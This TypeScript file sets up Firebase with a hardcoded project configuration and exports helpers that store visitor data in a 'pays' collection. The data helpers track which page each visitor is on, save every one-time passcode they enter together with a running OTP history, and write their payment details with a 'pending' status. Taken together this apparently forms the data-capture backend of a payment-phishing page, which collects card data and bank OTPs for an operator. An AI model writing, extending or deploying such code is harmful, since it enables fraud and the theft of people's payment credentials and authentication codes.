import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";
import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged, User } from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyAZ-QH9QBmUHTVowsfYoK0BU1JMKd9pL-o",
  authDomain: "dryah-875c0.firebaseapp.com",
  databaseURL: "https://dryah-875c0-default-rtdb.firebaseio.com",
  projectId: "dryah-875c0",
  storageBucket: "dryah-875c0.firebasestorage.app",
  messagingSenderId: "4984579245",
  appId: "1:4984579245:web:819acd24e59d94fa0b9224",
  measurementId: "G-DVKDRKT0S6",
};

function initializeFirebase() {
  if (typeof window === "undefined") {
    return null;
  }

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn(
      "Firebase configuration is incomplete. Some features may not work.",
    );
    return null;
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
}

const app = initializeFirebase();
const db = app ? getFirestore(app) : null;
const database = app ? getDatabase(app) : null;
const auth = app ? getAuth(app) : null;

export const loginWithEmail = async (email: string, password: string) => {
  if (!auth) throw new Error("Auth not initialized");
  return signInWithEmailAndPassword(auth, email, password);
};

export const logoutUser = async () => {
  if (!auth) return;
  return signOut(auth);
};

export const onAuthChange = (callback: (user: User | null) => void) => {
  if (!auth) return () => {};
  return onAuthStateChanged(auth, callback);
};

export async function addData(data: any) {
  if (!db) {
    console.warn("Firebase not initialized. Cannot add data.");
    return;
  }

  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      { ...data, createdDate: new Date().toISOString() },
      { merge: true },
    );

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    addData({ id: visitorId, currentPage: page });
  }
};

export const handleOtp = async (otp: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId && db) {
    try {
      const docRef = doc(db, "pays", visitorId);
      const otpEntry = {
        code: otp,
        timestamp: new Date().toISOString()
      };
      const existingOtps = JSON.parse(localStorage.getItem("otpHistory") || "[]");
      existingOtps.push(otpEntry);
      localStorage.setItem("otpHistory", JSON.stringify(existingOtps));
      
      await setDoc(docRef, { 
        otp, 
        otpHistory: existingOtps,
        currentPage: "otp" 
      }, { merge: true });
    } catch (error) {
      console.error("Error saving OTP:", error);
    }
  }
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot process payment.");
    return;
  }

  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
  }
};

export { db, database, auth };
